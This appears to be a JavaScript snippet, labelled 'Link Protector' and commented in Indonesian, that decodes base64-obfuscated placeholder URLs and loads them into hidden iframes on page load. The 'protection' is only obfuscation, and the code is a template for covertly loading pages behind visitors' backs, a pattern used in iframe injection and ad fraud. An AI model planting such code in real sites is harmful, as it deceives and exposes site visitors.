// Link Protector JavaScript
(function() {
  // URL terenkripsi Base64
  const protectedURLs = [
    "aHR0cHM6Ly93d3cuZXhhbXBsZS5jb20vbGluazE=",
    "aHR0cHM6Ly93d3cuZXhhbXBsZS5jb20vbGluazI="
  ];

  // Dekripsi URL
  function decodeBase64(encoded) {
    try {
      return atob(encoded);
    } catch (e) {
      console.error("Gagal mendekripsi URL:", e);
      return null;
    }
  }

  // Memuat URL melalui iframe tersembunyi
  function loadInIframe(url) {
    if (!url) return;
    const iframe = document.createElement('iframe');
    iframe.src = url;
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
  }

  // Pemrosesan URL secara bertahap
  function processURLs() {
    protectedURLs.forEach((encodedURL, index) => {
      const decryptedURL = decodeBase64(encodedURL);
      setTimeout(() => loadInIframe(decryptedURL), index * 3000);
    });
  }

  // Eksekusi saat DOM siap
  if (document.readyState === "complete" || document.readyState === "interactive") {
    processURLs();
  } else {
    document.addEventListener("DOMContentLoaded", processURLs);
  }
})();